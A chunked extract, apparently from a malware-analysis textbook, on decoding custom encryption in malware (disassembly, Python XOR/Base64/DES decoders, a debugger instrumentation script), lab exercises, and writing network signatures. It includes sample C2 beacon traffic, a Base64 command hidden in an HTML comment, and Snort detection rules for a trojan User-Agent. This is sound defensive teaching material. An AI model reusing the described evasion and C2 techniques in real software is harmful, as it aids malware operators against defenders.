A more interesting feature is the spike at the end of the file to about 5.5. 
The fact that it is a fairly high value unconnected with any other peaks makes 
it stand out. When analyzed, it is found to be DES-encrypted configuration 
data for the malware, which hides its command-and-control information.
[Word Count: 100]

Malware often uses homegrown encoding schemes. One such scheme is to 
layer multiple simple encoding methods. For example, malware may per-
form one round of XOR encryption and then afterward perform Base64 
encoding on the result. Another type of scheme is to simply develop a cus-
tom algorithm, possibly with similarities to a standard published crypto-
graphic algorithm.
[Word Count: 58]

We have discussed a variety of ways to identify common cryptography and 
encoding functions within malware when there are easily identifiable strings 
or constants. In many cases, the techniques already discussed can assist with 
finding custom cryptographic techniques. If there are no obvious signs, how-
ever, the job becomes more difficult.
For example, say we find malware with a bunch of encrypted files in the 
same directory, each roughly 700KB in size. Listing 13-6 shows the initial 
bytes of one of these files.
[Word Count: 83]

88 5B D9 02 EB 07 5D 3A 8A 06 1E 67 D2 16 93 7F    .[....]:...g....
43 72 1B A4 BA B9 85 B7 74 1C 6D 03 1E AF 67 AF    Cr......t.m...g.
98 F6 47 36 57 AA 8E C5 1D 70 A5 CB 38 ED 22 19    ..G6W....p..8.".
86 29 98 2D 69 62 9E C0 4B 4F 8B 05 A0 71 08 50    .).-ib..KO...q.P
92 A0 C3 58 4A 48 E4 A3 0A 39 7B 8A 3C 2D 00 9E    ...XJH...9{.<-..
[Word Count: 85]

Listing 13-6: First bytes of an encrypted file
[Word Count: 8]

Figure 13-14: Function graph showing an encrypted write
[Word Count: 8]

Figure 13-15 shows the relationships among the encryption functions. 
Notice the relationship between sub_40106C and sub_40112F, which both have 
a common subroutine. sub_40106C also has no parameters and will always 
occur before the call to sub_40112F. If sub_40106C is an initialization function 
for the cryptographic routine, then it should share some global variables 
with sub_40112F.
[Word Count: 55]

Figure 13-15: Connected encryption function
[Word Count: 5]

loc_40122A:             ; lpOverlapped
push    0
lea     edx, [ebp+NumberOfBytesWritten]
push    edx             ; lpNumberOfBytesWritten
mov     eax, [ebp+nNumberOfBytesToWrite]
push    eax             ; nNumberOfBytesToWrite
mov     ecx, [ebp+lpBuffer]
push    ecx             ; lpBuffer
mov     edx, [ebp+hObject]
push    edx             ; hFile
call    ds:WriteFile
mov     [ebp+var_8], eax
cmp     [ebp+var_8], 0
jz      short loc_401253
[Word Count: 44]

loc_4011FA:
mov     ecx, [ebp+var_4]
cmp     ecx, [ebp+nNumberOfBytesToWrite]
jnb     short loc_40122A
[Word Count: 10]

mov     edx, [ebp+lpBuffer]
add     edx, [ebp+var_4]
movsx   ebx, byte ptr [edx]
call    sub_40112F
and     eax, 0FFh
xor     ebx, eax
mov     eax, [ebp+lpBuffer]
add     eax, [ebp+var_4]
mov     [eax], bl
mov     ecx, [ebp+var_4]
add     ecx, 1
mov     [ebp+var_4], ecx
jmp     short loc_4011FA
[Word Count: 40]

WriteFile
sub_40106C
CreateFileA
CloseHandle
sub_40112F
[Word Count: 5]

Advantages of Custom Encoding to the Attacker
[Word Count: 7]

Finding encoding functions to isolate them is an important part of the analy-
sis process, but typically you’ll also want to decode the hidden content. There 
are two fundamental ways to duplicate the encoding or decoding functions 
in malware:
[Word Count: 39]


Use the functions as they exist in the malware itself.
[Word Count: 11]

The most economical way to decrypt data—whether or not the algorithm is 
known—is to let the program itself perform the decryption in the course of 
its normal activities. We call this process self-decoding.
If you’ve ever stopped a malware program in a debugger and noticed a 
string in memory that you didn’t see when you ran strings, you have already 
used the self-decoding technique. If the previously hidden information is
[Word Count: 70]

Manual Programming of Decoding Functions
[Word Count: 5]

For simple ciphers and encoding methods, you can often use the standard 
functions available within a programming language. For example, Listing 13-7 
shows a small Python program that decodes a standard Base64-encoded string. 
Replace the example_string variable to decode the string of interest.
[Word Count: 43]

example_string = 'VGhpcyBpcyBhIHRlc3Qgc3RyaW5n'
print base64.decodestring(example_string)
[Word Count: 5]

Listing 13-7: Sample Python Base64 script
[Word Count: 6]

For simple encoding methods that lack standard functions, such as XOR 
encoding or Base64 encoding that uses a modified alphabet, often the easiest 
course of action is to just program or script the encoding function in the 
language of your choice. Listing 13-8 shows an example of a Python func-
tion that implements a NULL-preserving XOR encoding, as described ear-
lier in this chapter.
[Word Count: 64]

def null_preserving_xor(input_char,key_char):
    if (input_char == key_char or input_char == chr(0x00)):
        return input_char
    else:
        return chr(ord(input_char) ^ ord(key_char))
[Word Count: 17]

Listing 13-8: Sample Python NULL-preserving XOR script
[Word Count: 7]

This function takes in two characters—an input character and a key 
character—and outputs the translated character. To convert a string or 
longer content using NULL-preserving single-byte XOR encoding, just 
send each input character with the same key character to this subroutine.
Base64 with a modified alphabet requires a similarly simple script. For 
example, Listing 13-9 shows a small Python script that translates the custom 
Base64 characters to the standard Base64 characters, and then uses the stan-
dard decodestring function that is part of the Python base64 library.
[Word Count: 87]

s = ""
custom = "9ZABCDEFGHIJKLMNOPQRSTUVWXYabcdefghijklmnopqrstuvwxyz012345678+/"
Base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
[Word Count: 9]

for ch in ciphertext:
    if (ch in Base64):
        s = s + Base64[string.find(custom,str(ch))]
    elif (ch == '='):
        s += '='
[Word Count: 20]

Listing 13-9: Sample Python custom Base64 script
[Word Count: 7]

For standard cryptographic algorithms, it is best to use existing imple-
mentations that are available in code libraries. A Python-based cryptography 
library called PyCrypto (http://www.dlitz.net/software/pycrypto/) provides a wide 
variety of cryptographic functions. Similar libraries exist for different lan-
guages. Listing 13-10 shows a sample Python program that performs decryp-
tion using the DES algorithm.
[Word Count: 54]

from Crypto.Cipher import DES
import sys
[Word Count: 6]

obj = DES.new('password',DES.MODE_ECB)
cfile = open('encrypted_file','r')
cbuf = cfile.read()
print obj.decrypt(cbuf)
[Word Count: 11]

Using Instrumentation for Generic Decryption
[Word Count: 5]

Listing 13-11: Code from malware that produces large encrypted files
[Word Count: 10]

We know a couple of key pieces of information from our previous 
analysis:
[Word Count: 13]


We know that the function sub_40112F initializes the encryption, and 
that this is the start of the encryption routine, which is called at address 
0x4011F5. In Listing 13-11, this function is labeled encrypt_Init.
[Word Count: 34]


We know that when we reach address 0x40122A, the encryption has been 
completed.
[Word Count: 14]


We know several of the variables and arguments that are used in the 
encryption function. These include the counter and two arguments: 
the buffer (lpBuffer) to be encrypted or decrypted and the length 
(nNumberOfBytesToWrite) of the buffer.
[Word Count: 38]

We have an encrypted file, the malware itself, and the knowledge of how 
its encryption function works. Our high-level goal is to instrument the mal-
ware so that it takes the encrypted file and runs it through the same routine 
it used for encryption. (We are assuming based on the use of XOR that the 
function is reversible.) This high-level goal can be broken down into a series 
of tasks:
[Word Count: 70]

2.
Prepare the encrypted file for reading and prepare an output file for 
writing.
[Word Count: 14]

3.
Allocate memory inside the debugger so that the malware can reference 
the memory.
[Word Count: 14]

4.
Load the encrypted file into the allocated memory region.
[Word Count: 10]

5.
Set up the malware with appropriate variables and arguments for the 
encryption function.
[Word Count: 14]

6.
Run the encryption function to perform the encryption.
[Word Count: 9]

7.
Write the newly decrypted memory region to the output file.
[Word Count: 11]

In order to implement the instrumentation to perform these high-level 
tasks, we will use the Immunity Debugger (ImmDbg), which was introduced 
in Chapter 9. ImmDbg allows Python scripts to be used to program the 
debugger. The ImmDbg script in Listing 13-12 is a fairly generic sample 
that has been written to process the encrypted files that were found with 
the malware, thereby retrieving the plaintext.
[Word Count: 65]

def main ():
    imm = immlib.Debugger()
    cfile = open("C:\\encrypted_file","rb") # Open encrypted file for read
    pfile = open("decrypted_file", "w")     # Open file for plaintext
    buffer = cfile.read()                   # Read encrypted file into buffer
    sz = len(buffer)                        # Get length of buffer
    membuf = imm.remoteVirtualAlloc(sz)     # Allocate memory within debugger
    imm.writeMemory(membuf,buffer)          # Copy into debugged process's memory
[Word Count: 56]

imm.setReg("EIP", 0x004011A9)           # Start of function header
    imm.setBreakpoint(0x004011b7)           # After function header
    imm.Run()                               # Execute function header
[Word Count: 17]

regs = imm.getRegs()
    imm.writeLong(regs["EBP"]+16, sz)       # Set NumberOfBytesToWrite stack variable
    imm.writeLong(regs["EBP"]+8, membuf)    # Set lpBuffer stack variable
[Word Count: 17]

imm.setReg("EIP", 0x004011f5)           # Start of crypto
    imm.setBreakpoint(0x0040122a)           # End of crypto loop
    imm.Run()                               # Execute crypto loop
    
    output = imm.readMemory(membuf, sz)     # Read answer
    pfile.write(output)                     # Write answer
[Word Count: 28]

Listing 13-12: ImmDbg sample decryption script
[Word Count: 6]


The initial portion of code run is the start of the function, which sets 
up the stack frame and sets the counter to zero. This first stage is from 
0x004011A9 (where EIP is set) until 0x004011b7 (where a breakpoint 
stops execution).
[Word Count: 42]


The second part of the code to run is the actual encryption loop, for which 
the debugger moves the instruction pointer to the start of the crypto-
graphic initialization function at 0x004011f5. This second stage is from 
0x004011f5 (where EIP is set), through the loop one time for each byte 
decrypted, until the loop is exited and 0x0040122a is reached (where a 
breakpoint stops execution).
[Word Count: 66]

Analyze the malware found in the file Lab13-01.exe.
[Word Count: 8]

1.
Compare the strings in the malware (from the output of the strings com-
mand) with the information available via dynamic analysis. Based on this 
comparison, which elements might be encoded?
[Word Count: 31]

2.
Use IDA Pro to look for potential encoding by searching for the string 
xor. What type of encoding do you find?
[Word Count: 22]

3.
What is the key used for encoding and what content does it encode?
[Word Count: 14]

4.
Use the static tools FindCrypt2, Krypto ANALyzer (KANAL), and the 
IDA Entropy Plugin to identify any other encoding mechanisms. What 
do you find?
[Word Count: 24]

5.
What type of encoding is used for a portion of the network traffic sent by 
the malware?
[Word Count: 18]

6.
Where is the Base64 function in the disassembly?
[Word Count: 9]

7.
What is the maximum length of the Base64-encoded data that is sent? 
What is encoded?
[Word Count: 16]

8.
In this malware, would you ever see the padding characters (= or ==) in 
the Base64-encoded data?
[Word Count: 18]

Analyze the malware found in the file Lab13-02.exe.
[Word Count: 8]

1.
Using dynamic analysis, determine what this malware creates.
[Word Count: 9]

2.
Use static techniques such as an xor search, FindCrypt2, KANAL, and the 
IDA Entropy Plugin to look for potential encoding. What do you find?
[Word Count: 25]

3.
Based on your answer to question 1, which imported function would be a 
good prospect for finding the encoding functions?
[Word Count: 21]

4.
Where is the encoding function in the disassembly?
[Word Count: 9]

5.
Trace from the encoding function to the source of the encoded content. 
What is the content?
[Word Count: 17]

6.
Can you find the algorithm used for encoding? If not, how can you 
decode the content?
[Word Count: 17]

7.
Using instrumentation, can you recover the original source of one of the 
encoded files?
[Word Count: 15]

Analyze the malware found in the file Lab13-03.exe.
[Word Count: 8]

1.
Compare the output of strings with the information available via 
dynamic analysis. Based on this comparison, which elements might 
be encoded?
[Word Count: 22]

2.
Use static analysis to look for potential encoding by searching for the 
string xor. What type of encoding do you find?
[Word Count: 22]

3.
Use static tools like FindCrypt2, KANAL, and the IDA Entropy Plugin to 
identify any other encoding mechanisms. How do these findings com-
pare with the XOR findings?
[Word Count: 28]

4.
Which two encoding techniques are used in this malware?
[Word Count: 10]

5.
For each encoding technique, what is the key?
[Word Count: 9]

6.
For the cryptographic encryption algorithm, is the key sufficient? What 
else must be known?
[Word Count: 15]

8.
Create code to decrypt some of the content produced during dynamic 
analysis. What is this content?
[Word Count: 17]

M A L W A R E - F O C U S E D  
N E T W O R K S I G N A T U R E S
[Word Count: 32]

Malware makes heavy use of network connectivity, 
and in this chapter, we’ll explain how to develop effec-
tive network-based countermeasures. Countermeasures 
are actions taken in response to threats, to detect or 
prevent malicious activity. To develop effective countermeasures, you must 
understand how malware uses the network and how the challenges faced by 
malware authors can be used to your advantage.
[Word Count: 60]

Basic attributes of network activity—such as IP addresses, TCP and UDP 
ports, domain names, and traffic content—are used by networking and 
security devices to provide defenses. Firewalls and routers can be used to 
restrict access to a network based on IP addresses and ports. DNS servers 
can be configured to reroute known malicious domains to an internal host, 
known as a sinkhole. Proxy servers can be configured to detect or prevent 
access to specific domains.
[Word Count: 75]

Intrusion detection systems (IDSs), intrusion prevention systems (IPSs), 
and other security appliances, such as email and web proxies, make it possible 
to employ content-based countermeasures. Content-based defense systems allow 
for deeper inspection of traffic, and include the network signatures used by 
an IDS and the algorithms used by a mail proxy to detect spam. Because basic 
network indicators such as IP addresses and domain names are supported by 
most defensive systems, they are often the first items that a malware analyst will 
investigate.
[Word Count: 83]

NOTE
The commonly used term intrusion detection system is outdated. Signatures are 
used to detect more than just intrusions, such as scanning, service enumeration and 
profiling, nonstandard use of protocols, and beaconing from installed malware. An 
IPS is closely related to an IDS, the difference being that while an IDS is designed to 
merely detect the malicious traffic, an IPS is designed to detect malicious traffic and 
prevent it from traveling over the network.
[Word Count: 74]

Observing the Malware in Its Natural Habitat
[Word Count: 7]


Live-captured information will provide the most transparent view of a 
malicious application’s true behavior. Malware can be programmed to 
detect lab environments.
[Word Count: 23]


Existing information from active malware can provide unique insights 
that accelerate analysis. Real traffic provides information about the mal-
ware at both end points (client and server), whereas in a lab environ-
ment, the analyst typically has access only to information about one of 
the end points. Analyzing the content received by malware (the parsing 
routines) is typically more challenging than analyzing the content mal-
ware produces. Therefore, bidirectional sample traffic can help seed the 
analysis of the parsing routines for the malware the analyst has in hand.
[Word Count: 89]


Additionally, when passively reviewing information, there is no risk that 
your analysis activities will be leaked to the attacker. This issue will be 
explained in detail in “OPSEC = Operations Security” on page 299.
[Word Count: 35]

Suppose we’ve received a malware executable to analyze, and we run it in 
our lab environment, keeping an eye on networking events. We find that
[Word Count: 25]

the malware does a DNS request for www.badsite.com, and then does an 
HTTP GET request on port 80 to the IP address returned in the DNS record. 
Thirty seconds later, it tries to beacon out to a specific IP address without 
doing a DNS query. At this point, we have three potential indicators of 
malicious activity: a domain name with its associated IP address, a stand-
alone IP address, and an HTTP GET request with URI and contents, as 
shown in Table 14-1.
[Word Count: 83]

We would probably want to further research these indicators. Internet 
searches might reveal how long ago the malware was created, when it was 
first detected, how prevalent it is, who might have written it, and what the 
attackers’ objectives might be. A lack of information is instructive as well, 
since it can imply the existence of a targeted attack or a new campaign.
Before rushing to your favorite search engine, however, it is important to 
understand the potential risks associated with your online research activities.
[Word Count: 85]


Send a targeted phishing (known as spear-phishing) email with a link to 
a specific individual and watch for access attempts to that link from IP 
addresses outside the expected geographical area.
[Word Count: 32]


Design an exploit to create an encoded link in a blog comment (or some 
other Internet-accessible and freely editable site), effectively creating a 
private but publicly accessible infection audit trail.
[Word Count: 31]

Table 14-1: Sample Network Indicators of Malicious Activity
[Word Count: 8]

Domain (with resolved IP address)
www.badsite.com (123.123.123.10)
[Word Count: 7]

GET request
GET /index.htm HTTP 1.1
Accept: */*
User-Agent: Wefa7e
Cache-Control: no
[Word Count: 12]


Embed an unused domain in malware and watch for attempts to resolve 
the domain.
[Word Count: 15]

If attackers are aware that they are being investigated, they may change 
tactics and effectively disappear.
[Word Count: 16]

The safest option is to not use the Internet to investigate the attack at all, but 
this is often impractical. If you do use the Internet, you should use indirec-
tion to evade the attacker’s potentially watchful eye.
[Word Count: 38]

One indirection tactic is to use some service or mechanism that is designed to 
provide anonymity, such as Tor, an open proxy, or a web-based anonymizer. 
While these types of services may help to protect your privacy, they often pro-
vide clues that you are trying to hide, and thus could arouse the suspicions of 
an attacker.
Another tactic is to use a dedicated machine, often a virtual machine, for 
research. You can hide the precise location of a dedicated machine in several 
ways, such as the following:
[Word Count: 88]


By tunneling your connection via Secure Shell (SSH) or a virtual private 
network (VPN) through a remote infrastructure
[Word Count: 19]


By using an ephemeral remote machine running in a cloud service, such 
as Amazon Elastic Compute Cloud (Amazon EC2)
[Word Count: 20]

A search engine or site designed for Internet research can also provide 
indirection. Searching in a search engine is usually fairly safe, with two caveats:
[Word Count: 25]


The inclusion of a domain name in a query that the engine was not pre-
viously aware of may prompt crawler activity.
[Word Count: 23]


Clicking search engine results, even for cached resources, still activates 
the secondary and later links associated with the site.
[Word Count: 20]

The next section highlights a few websites that provide consolidated 
information about networking entities, such as whois records, DNS lookups 
(including historical lookup records), and reverse DNS lookups.
[Word Count: 28]

Getting IP Address and Domain Information
[Word Count: 6]

The two fundamental elements that compose the landscape of the Internet 
are IP addresses and domain names. DNS translates domain names like 
www.yahoo.com into IP addresses (and back). Unsurprisingly, malware also 
uses DNS to look like regular traffic, and to maintain flexibility and robust-
ness when hosting its malicious activities.
[Word Count: 50]

Figure 14-1: Types of information available about DNS domains and IP addresses
[Word Count: 12]

While both of the domain and IP registries can be queried manually 
using command-line tools, there are also numerous free websites that will 
perform these basic lookups for you. Using websites to query has several 
advantages:
[Word Count: 36]


Many will do follow-on lookups automatically.
[Word Count: 7]


They frequently provide additional metadata based on historical infor-
mation or queries of other sources of information, including blacklists 
and geographical information for IP addresses.
[Word Count: 26]

Figure 14-2 is an example of two whois requests for domains that were 
used as command-and-control servers for backdoors used in targeted attacks. 
Although the backdoors were different, the name listed under the registra-
tion is the same for both domains.
Three lookup sites deserve special mention:
[Word Count: 47]

DomainTools (http://www.domaintools.com/)
Provides historical whois records, reverse IP lookups showing all the 
domains that resolve to a particular IP address, and reverse whois, allow-
ing whois record lookups based on contact information metadata. Some 
of the services provided by DomainTools require membership, and some 
also require payment.
[Word Count: 47]

RobTex (http://www.robtex.com/)
Provides information about multiple domain names that point to a 
single IP address and integrates a wealth of other information, such 
as whether a domain or IP address is on one of several blacklists.
[Word Count: 36]

BFK DNS logger (http://www.bfk.de/bfk_dnslogger_en.html)
Uses passive DNS monitoring information. This is one of the few freely 
available resources that does this type of monitoring. There are several 
other passive DNS sources that require a fee or are limited to profes-
sional security researchers.
[Word Count: 43]

Figure 14-2: Sample whois request for two different domains
[Word Count: 9]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"TROJAN Malicious User-Agent"; 
content:"|0d 0a|User-Agent\: Wefa7e"; classtype:trojan-activity; sid:2000001; rev:1;)
[Word Count: 16]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"ET TROJAN 
WindowsEnterpriseSuite FakeAV Dynamic User-Agent"; flow:established,to_server; 
content:"|0d 0a|User-Agent\: We"; isdataat:6,relative; content:"|0d 0a|"; 
distance:0; pcre:"/User-Agent\: We[a-z0-9]{4}\x0d\x0a/"; 
classtype:trojan-activity; reference:url,www.threatexpert.com/report.aspx?md5=
d9bcb4e4d650a6ed4402fab8f9ef1387; sid:2010262; rev:1;)
[Word Count: 28]

This rule has a couple of additional keywords, as described in Table 14-3.
[Word Count: 13]

Table 14-2: Snort Rule Keyword Descriptions
[Word Count: 6]

msg
The message to print with an alert or log entry
[Word Count: 11]

content
Searches for specific content in the packet payload 
(see the discussion following the table)
[Word Count: 15]

classtype
General category to which rule belongs
[Word Count: 7]

rev
With sid, uniquely identifies rule revisions
[Word Count: 7]

While the rule is rather long, the core of the rule is simply the User-
Agent string where We is followed by exactly four alphanumeric characters 
(We[a-z0-9]{4}). In the Perl Compatible Regular Expressions (PCRE) nota-
tion used by Snort, the following characters are used:
[Word Count: 44]


Square brackets ([ and ]) indicate a set of possible characters.
[Word Count: 12]


Curly brackets ({ and }) indicate the number of characters.
[Word Count: 11]


Hexadecimal notation for bytes is of the form \xHH.
[Word Count: 10]

alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"ET TROJAN 
WindowsEnterpriseSuite FakeAV Dynamic User-Agent"; flow:established,to_server; 
content:"|0d 0a|User-Agent|3a| We"; isdataat:6,relative; content:"|0d 0a|"; 
distance:0; content:!"User-Agent|3a| Webmin|0d 0a|"; 
pcre:"/User-Agent\: We[a-z0-9]{4}\x0d\x0a/"; classtype:trojan-activity; 
reference:url,www.threatexpert.com/report.aspx?md5=d9bcb4e4d650a6ed4402fab8f9
ef1387; reference:url,doc.emergingthreats.net/2010262; reference:url,www.emer
gingthreats.net/cgi-bin/cvsweb.cgi/sigs/VIRUS/TROJAN_WindowsEnterpriseFakeAV; 
sid:2010262; rev:4;)
[Word Count: 34]

The bang symbol (!) before the content expression (content:!"User-
Agent|3a| Webmin|0d 0a|") indicates a logically inverted selection (that is, not), 
so the rule will trigger only if the content described is not present.
This example illustrates several attributes typical of the signature-
development process. First, most signatures are created based on analysis 
of the network traffic, rather than on analysis of the malware that generates 
the traffic. In this example, the submitter identified two strings generated 
by the malware, and speculated that the malware uses the We prefix plus four 
additional random alphanumeric characters.
[Word Count: 94]

Table 14-3: Additional Snort Rule Keyword Descriptions
[Word Count: 7]

flow
Specifies characteristics of the TCP flow being inspected, such as whether a flow 
has been established and whether packets are from the client or the server
[Word Count: 27]

isdataat
Verifies that data exists at a given location (optionally relative to the last match)
[Word Count: 15]

distance
Modifies the content keyword; indicates the number of bytes that should be 
ignored past the most recent pattern match
[Word Count: 20]

pcre
A Perl Compatible Regular Expression that indicates the pattern of bytes to match
[Word Count: 14]

reference
A reference to an external system
[Word Count: 7]

While the signature may catch some instances, it obviously is not ideal 
given that whatever is generating the traffic can produce Wf and W1 (at least) 
in addition to We. Also, it is clear from this sample that although the User-
Agent is often six characters, it could be seven characters.
[Word Count: 51]

Assuming that we didn’t have any live traffic to cross-check with, we 
might mistakenly write a rule to detect this single User-Agent. However, 
the next host to run the malware might produce this:
[Word Count: 33]

When writing signatures, it is important to identify variable elements of 
the targeted content so that they are not mistakenly included in the signa-
ture. Content that is different on every trial run typically indicates that the 
source of the data has some random seed. Content that is static for a partic-
ular host but varies with different hosts suggests that the content is derived 
from some host attribute. In some lucky cases, content derived from a host 
attribute may be sufficiently predictable to justify inclusion in a network 
signature.
[Word Count: 90]

Combining Dynamic and Static Analysis Techniques
[Word Count: 6]

So far, we have been using either existing data or output from dynamic anal-
ysis to inform the generation of our signatures. While such measures are 
expedient and generate information quickly, they sometimes fail to identify 
the deeper characteristics of the malware that can lead to more accurate and 
longer-lasting signatures.
In general, there are two objectives of deeper analysis:
[Word Count: 60]

Full coverage of functionality
The first step is increasing the coverage of code using dynamic analysis. 
This process is described in Chapter 3, and typically involves providing
[Word Count: 27]

new inputs so that the code continues down unused paths, in order to 
determine what the malware is expecting to receive. This is typically 
done with a tool like INetSim or with custom scripts. The process can 
be guided either by actual malware traffic or by static analysis.
[Word Count: 48]

Understanding functionality, including inputs and outputs
Static analysis can be used to see where and how content is generated, 
and to predict the behavior of malware. Dynamic analysis can then be 
used to confirm the expected behavior predicted by static analysis.
[Word Count: 41]

If the goal of malware analysis is to develop effective network indicators, 
then you don’t need to understand every block of code. But how do you 
know whether you have a sufficient understanding of the functionality of 
a piece of malware? Table 14-4 proposes a hierarchy of analysis levels.
[Word Count: 49]

Evading detection is one of the primary objectives of someone operating a 
backdoor, since being detected results in both the loss of the attacker’s 
access to an existing victim and an increased risk of future detection.
[Word Count: 36]

Surface analysis
An analysis of initial indicators, equivalent to sandbox output
[Word Count: 11]

Communication method 
coverage
An understanding of the code for each type of communication 
technique
[Word Count: 14]

Operational replication
The ability to create a tool that allows for full operation of the 
malware (a server-based controller, for example)
[Word Count: 21]

Code coverage
An understanding of every block of code
[Word Count: 9]

Malware has evolved to evade detection by trying to blend in with the back-
ground, using the following techniques.
[Word Count: 19]

GET /world.html HTTP/1.1
User-Agent: %^&NQvtmw3eVhTfEBnzVw/aniIqQB6qQgTvmxJzVhjqJMjcHtEhI97n9+yy+duq+h3
b0RFzThrfE9AkK9OYIt6bIM7JUQJdViJaTx+q+h3dm8jJ8qfG+ezm/C3tnQgvVx/eECBZT87NTR/fU
QkxmgcGLq
Cache-Control: no-cache
[Word Count: 9]

GET /world.html HTTP/1.1
User-Agent: %^&EBTaVDPYTM7zVs7umwvhTM79ECrrmd7ZVd7XSQFvV8jJ8s7QVhcgVQOqOhPdUQB
XEAkgVQFvms7zmd6bJtSfHNSdJNEJ8qfGEA/zmwPtnC3d0M7aTs79KvcAVhJgVQPZnDIqSQkuEBJvn
D/zVwneRAyJ8qfGIN6aIt6aIt6cI86qI9mlIe+q+OfqE86qLA/FOtjqE86qE86qE86qHqfGIN6aIt6
[Word Count: 7]

aIt6cI86qI9mlIe+q+OfqE86qLA/FOtjqE86qE86qE86qHsjJ8tAbHeEbHeEbIN6qE96jKt6kEABJE
86qE9cAMPE4E86qE86qE86qEA/vmhYfVi6J8t6dHe6cHeEbI9uqE96jKtEkEABJE86qE9cAMPE4E86
qE86qE86qEATrnw3dUR/vmbfGIN6aINAaIt6cI86qI9ulJNmq+OfqE86qLA/FOtjqE86qE86qE86qN
Ruq/C3tnQgvVx/e9+ybIM2eIM2dI96kE86cINygK87+NM6qE862/AvMLs6qE86qE86qE87NnCBdn87
JTQkg9+yqE86qE86qE86qE86qE86bEATzVCOymduqE86qE86qE86qE86qE96qSxvfTRIJ8s6qE86qE
86qE86qE86qE9Sq/CvdGDIzE86qK8bgIeEXItObH9SdJ87s0R/vmd7wmwPv9+yJ8uIlRA/aSiPYTQk
fmd7rVw+qOhPfnCvZTiJmMtj
Cache-Control: no-cache
[Word Count: 9]

Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; 
.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
[Word Count: 18]

The first generation of malware that mimicked the web browser used 
completely manufactured User-Agent strings. Consequently, this malware 
was easily detectable by the User-Agent field alone. The next generation of 
malware included measures to ensure that its User-Agent string used a field 
that was common in real network traffic. While that made the attacker blend 
in better, network defenders could still use a static User-Agent field to create 
effective signatures.
Here is an example of a generic but popular User-Agent string that mal-
ware might employ:
[Word Count: 86]

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
[Word Count: 7]

In the next stage, malware introduced a multiple-choice scheme. The mal-
ware would include several User-Agent fields—all commonly used by normal 
traffic—and it would switch between them to evade detection. For example, 
malware might include the following User-Agent strings:
[Word Count: 39]

Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)
[Word Count: 25]

The latest User-Agent technique uses a native library call that constructs 
requests with the same code that the browser uses. With this technique, the 
User-Agent string from the malware (and most other aspects of the request 
as well) is indistinguishable from the User-Agent string from the browser.
[Word Count: 47]

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/
TR/xhtml1/DTD/xhtml1-strict.dtd"> 
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"> 
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>  Roaring Capital | Seed Stage Venture Capital Fund in Chicago</title> 
<meta property="og:title" content="  Roaring Capital | Seed Stage Venture 
Capital Fund in Chicago"/> 
<meta property="og:site_name" content="Roaring Capital"/>
<!--  -->
<!-- adsrv?bG9uZ3NsZWVw --> 
<!--<script type="text/javascript" src="/js/dotastic.custom.js"></script>--> 
<!-- OH -->
[Word Count: 58]

The third line from the bottom is actually an encoded command to mal-
ware to sleep for a long time before checking back. (The Base64 decoding of 
bG9uZ3NsZWVw is longsleep.) The malware reads this command and calls a sleep 
command to sleep the malware process. From a defender’s point of view, it is 
extremely difficult to tell the difference between a valid request for a real 
web page and malware making the same request but interpreting some part 
of the web page as a command.
[Word Count: 85]

There are two types of networking activities: sending data and receiving data. 
Analyzing outgoing data is usually easier, since the malware produces conve-
nient samples for analysis whenever it runs.
We’ll look at two malware samples in this section. The first one is creating 
and sending out a beacon, and the other gets commands from an infected 
website.
The following are excerpts from the traffic logs for a hypothetical piece 
of malware’s activities on the live network. In these traffic logs, the malware 
appears to make the following GET request:
[Word Count: 90]

GET /1011961917758115116101584810210210256565356 HTTP/1.1
Accept: * / *
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: www.badsite.com
Connection: Keep-Alive
Cache-Control: no-cache
[Word Count: 21]

Running the malware in our lab environment (or sandbox), we notice 
the malware makes the following similar request:
[Word Count: 18]

GET /14586205865810997108584848485355525551 HTTP/1.1
Accept: * / *
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
Host: www.badsite.com
Connection: Keep-Alive
Cache-Control: no-cache
[Word Count: 21]

Using Internet Explorer, we browse to a web page and find that the stan-
dard User-Agent on this test system is as follows:
[Word Count: 23]

User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; 
.NET CLR 2.0.50727; .NET CLR 3.0.04506.648)
[Word Count: 15]

/1011961917758115116101584810210210256565356 (actual traffic)
/14586205865810997108584848485355525551
/7911554172581099710858484848535654100102
/2332511561845810997108584848485357985255
[Word Count: 6]

It appears as though there might be some common characters in the 
middle of these strings (5848), but the pattern is not easily discernible. Static 
analysis can be used to figure out exactly how the request is being created.
[Word Count: 39]

Returning to our sample malware, its imported functions include 
InternetOpen and HTTPOpenRequest, suggesting that the malware uses the WinINet 
API. When we investigate the parameters to InternetOpen, we see that the 
User-Agent string is hard-coded in the malware. Additionally, HTTPOpenRequest 
takes a parameter that specifies the accepted file types, and we also see that 
this parameter contains hard-coded content. Another HTTPOpenRequest param-
eter is the URI path, and we see that the contents of the URI are generated 
from calls to GetTickCount, Random, and gethostbyname.
[Word Count: 85]

WSAStartup
InternetOpen
URLDownloadToFile
[Word Count: 3]

getaddrinfo
InternetConnect
CoInitialize
[Word Count: 3]

The element that is most valuable for signature generation is hard-coded 
data from the malware. Network traffic sent by malware will be constructed 
from a limited set of original sources. Creating an effective signature requires 
knowledge of the origin of each piece of network content. The following are 
the fundamental sources:
[Word Count: 51]


Random data (such as data that is returned from a call to a function that 
produces pseudorandom values)
[Word Count: 19]


Data from standard networking libraries (such as the GET created from a 
call to HTTPSendRequest)
[Word Count: 16]


Hard-coded data from malware (such as a hard-coded User-Agent string)
[Word Count: 11]


Data about the host and its configuration (such as the hostname, the cur-
